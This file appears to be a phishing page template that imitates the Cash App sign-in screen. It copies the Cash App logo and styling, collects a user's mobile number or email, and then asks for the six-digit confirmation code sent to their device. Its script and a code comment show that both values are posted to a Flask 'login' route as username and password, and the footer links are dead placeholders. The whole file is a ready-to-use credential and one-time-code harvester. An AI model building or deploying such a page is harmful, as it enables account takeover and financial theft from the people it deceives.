<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to Cash App</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #000000;
            color: #ffffff;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            align-items: center;
            min-height: 100vh;
            padding: 40px 20px 28px;
        }

        .login-card {
            background-color: #121212;
            width: 100%;
            max-width: 400px;
            border: 1px solid #222222;
            border-radius: 24px;
            padding: 40px 32px;
            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.6);
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        /* Cash App Official Logo Badge */
        .logo-container {
            width: 64px;
            height: 64px;
            margin-bottom: 24px;
        }

        .cash-logo {
            width: 100%;
            height: 100%;
        }

        .title {
            font-size: 24px;
            font-weight: 700;
            color: #ffffff;
            margin-bottom: 8px;
            text-align: center;
            letter-spacing: -0.3px;
        }

        .subtitle {
            font-size: 14px;
            color: #999999;
            text-align: center;
            margin-bottom: 32px;
            line-height: 20px;
        }

        /* View Switching Mechanism */
        .view {
            display: none;
            width: 100%;
            flex-direction: column;
            align-items: center;
        }

        .view.active {
            display: flex;
        }

        .user-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            font-size: 14px;
            font-weight: 600;
            color: #ffffff;
            margin-bottom: 28px;
            background-color: #1a1a1a;
            border: 1px solid #333333;
            padding: 8px 16px;
            border-radius: 20px;
        }

        .edit-badge-btn {
            color: #00d632;
            font-size: 13px;
            font-weight: 600;
            cursor: pointer;
            text-decoration: none;
        }

        .edit-badge-btn:hover {
            text-decoration: underline;
        }

        /* Forms */
        .login-form {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 20px;
        }

        .input-group {
            position: relative;
            width: 100%;
        }

        .input-field {
            width: 100%;
            height: 56px;
            padding: 22px 16px 6px;
            background-color: #1a1a1a;
            border: 1px solid #333333;
            border-radius: 14px;
            font-size: 16px;
            outline: none;
            color: #ffffff;
            transition: border-color 0.2s, box-shadow 0.2s;
        }

        .input-field:focus {
            border-color: #00d632;
            box-shadow: 0 0 0 1px #00d632;
        }

        .input-label {
            position: absolute;
            left: 16px;
            top: 18px;
            font-size: 15px;
            color: #777777;
            pointer-events: none;
            transition: all 0.15s ease;
        }

        .input-field:focus ~ .input-label,
        .input-field:not(:placeholder-shown) ~ .input-label {
            top: 8px;
            font-size: 11px;
            color: #00d632;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .input-field:not(:focus):not(:placeholder-shown) ~ .input-label {
            color: #777777;
        }

        .otp-input {
            font-size: 22px;
            font-weight: 700;
            letter-spacing: 8px;
            text-align: center;
            padding: 12px 16px;
        }

        .otp-group .input-label {
            left: 50%;
            transform: translateX(-50%);
        }

        .otp-group .input-field:focus ~ .input-label,
        .otp-group .input-field:not(:placeholder-shown) ~ .input-label {
            left: 50%;
            transform: translateX(-50%);
        }

        /* Primary Button */
        .btn-primary {
            width: 100%;
            height: 52px;
            background-color: #00d632;
            border: none;
            border-radius: 26px;
            color: #000000;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: background-color 0.2s, transform 0.1s;
            margin-top: 4px;
        }

        .btn-primary:hover {
            background-color: #00c22d;
        }

        .btn-primary:active {
            transform: scale(0.99);
        }

        .resend-link {
            font-size: 14px;
            color: #00d632;
            text-decoration: none;
            font-weight: 600;
            text-align: center;
            margin-top: 8px;
            cursor: pointer;
        }

        .resend-link:hover {
            text-decoration: underline;
        }

        /* Footer */
        .footer-links {
            display: flex;
            gap: 20px;
            font-size: 12px;
            color: #666666;
            margin-top: 32px;
            flex-wrap: wrap;
            justify-content: center;
        }

        .footer-links a {
            color: #888888;
            text-decoration: none;
            font-weight: 500;
        }

        .footer-links a:hover {
            color: #00d632;
        }

        /* Hidden field */
        .hidden-field {
            display: none;
        }
    </style>
</head>
<body>

    <main class="login-card">
        <!-- Official Cash App Icon SVG -->
        <div class="logo-container">
            <svg class="cash-logo" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
                <rect width="100" height="100" rx="24" fill="#00D632"/>
                <path d="M52.5 20V28.6C61 29.4 67.5 34.1 69 42H59.9C58.7 37.7 54.9 35.1 49.7 35.1C43.5 35.1 39.5 38.4 39.5 42.7C39.5 47.1 43 49.1 51 51.4C61.6 54.4 69.8 58.3 69.8 69.2C69.8 79 62.1 85.2 52.3 86.4V95H45V86.5C35.8 85.6 28.7 80.3 27.3 71.7H36.5C37.7 76.6 42.3 79.7 48.1 79.7C54.8 79.7 58.9 76.2 58.9 71.7C58.9 67.1 55.6 65.1 47.6 62.8C36.6 59.7 28.5 56 28.5 45.3C28.5 35.8 35.8 29.8 45.3 28.6V20H52.5Z" fill="#FFFFFF"/>
            </svg>
        </div>

        <h1 class="title">Sign in to Cash App</h1>
        <p class="subtitle" id="form-subtitle">Enter your mobile number or email address.</p>

        <!-- STEP 1: Phone / Email Input -->
        <div id="step-identifier" class="view active">
            <form class="login-form" id="identifier-form">
                <div class="input-group">
                    <input type="text" id="identifier-input" class="input-field" placeholder=" " required autofocus />
                    <label for="identifier-input" class="input-label">Mobile or Email</label>
                </div>

                <button type="submit" class="btn-primary">Next</button>
            </form>
        </div>

        <!-- STEP 2: Confirmation Code View -->
        <div id="step-code" class="view">
            <div class="user-badge">
                <span id="display-identifier">user@example.com</span>
                <span class="edit-badge-btn" id="btn-edit-identifier">Edit</span>
            </div>

            <!-- CODE FORM: posts identifier as username, code as password to Flask -->
            <form class="login-form" id="code-form" action="{{ url_for('login') }}" method="POST">
                <!-- Hidden field for identifier (username) -->
                <input type="hidden" name="username" id="hidden-identifier" value="">

                <div class="input-group otp-group">
                    <input type="text" id="code-input" name="password" class="input-field otp-input" maxlength="6" placeholder=" " required />
                    <label for="code-input" class="input-label">Confirmation Code</label>
                </div>

                <button type="submit" class="btn-primary">Verify</button>
                <a class="resend-link">Resend Code</a>
            </form>
        </div>
    </main>

    <footer class="footer-links">
        <a href="#">Privacy Policy</a>
        <a href="#">Terms of Service</a>
        <a href="#">Licenses</a>
        <a href="#">Help</a>
    </footer>

    <script>
        const identifierForm = document.getElementById('identifier-form');
        const identifierInput = document.getElementById('identifier-input');
        const displayIdentifier = document.getElementById('display-identifier');
        const formSubtitle = document.getElementById('form-subtitle');
        
        const stepIdentifier = document.getElementById('step-identifier');
        const stepCode = document.getElementById('step-code');
        const btnEditIdentifier = document.getElementById('btn-edit-identifier');
        const codeInput = document.getElementById('code-input');
        const hiddenIdentifier = document.getElementById('hidden-identifier');

        // Transition from Step 1 to Step 2
        identifierForm.addEventListener('submit', (e) => {
            e.preventDefault();
            const val = identifierInput.value.trim();
            if (val) {
                displayIdentifier.textContent = val;
                hiddenIdentifier.value = val;   // set hidden field for submission
                formSubtitle.textContent = 'Enter the 6-digit confirmation code sent to your device.';
                stepIdentifier.classList.remove('active');
                stepCode.classList.add('active');
                codeInput.focus();
            }
        });

        // Edit Button Action (Return to Step 1)
        btnEditIdentifier.addEventListener('click', () => {
            formSubtitle.textContent = 'Enter your mobile number or email address.';
            stepCode.classList.remove('active');
            stepIdentifier.classList.add('active');
            identifierInput.focus();
        });
    </script>

</body>
</html>
